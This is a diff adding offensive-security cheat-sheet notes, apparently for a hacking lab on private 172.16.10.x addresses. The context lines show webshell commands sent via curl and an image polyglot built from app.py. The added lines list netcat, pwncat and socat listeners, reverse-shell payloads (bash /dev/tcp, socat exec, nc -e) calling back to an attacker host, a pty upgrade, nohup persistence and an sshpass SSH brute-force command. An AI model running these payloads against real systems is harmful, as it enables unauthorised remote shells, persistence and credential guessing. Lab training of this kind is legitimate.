@@ -82,3 +82,29 @@ cat app.py >> polyglot.jpg
 curl -s "http://172.16.10.10:8081/webshell/$(urlencode "ls")"
 curl -s "http://172.16.10.10:8081/webshell/$(urlencode "cd ..")"
 curl -s "http://172.16.10.10:8081/webshell/$(urlencode "cd ..; ls")"
+bash playground/exercises/run_webshell_opt.sh 172.16.10.10:8081
+
+# Reverse Shells
+
+Set up listener
+nc -l -p 1337 -vv
+nc -lvp 1234
+pwncat-cs -l -p 1337
+pwncat-cs -l -p 1337 --ssl (requires Ncat installed on victims machine)
+socat - tcp-listen:34459,fork
+socat file:$(tty),raw,echo=0 tcp-listen:1337
+
+Craft Payload
+|bash -c 'bash -i >& /dev/tcp/172.16.10.1/1337 0>&1'
+python3 -c 'import pty; pty.spawn("/bin/bash")'
+|socat exec:'bash -li',pty,stderr tcp:172.16.10.1:1337
+nc 172.16.10.1 1234 -e /bin/bash & (setup reverse shell via nc by uploading its binaries to the victims machine)
+
+bash ch07/port-hopper.sh
+nohup ./donation-monitor.sh > /dev/null 2>&1 &
+nohup ./donation-monitor.sh &> /dev/null & (nohup makes process ignore SIGHUP signal -- unstoppable process)
+
+# SSH Brute Force
+ssh user@172.16.10.13
+sshpass -p "my_password" ssh -o "StrictHostKeyChecking=no" \
+               -p 22 "username@172.16.10.13" exit &> /dev/null; echo "Command exit code: $?"
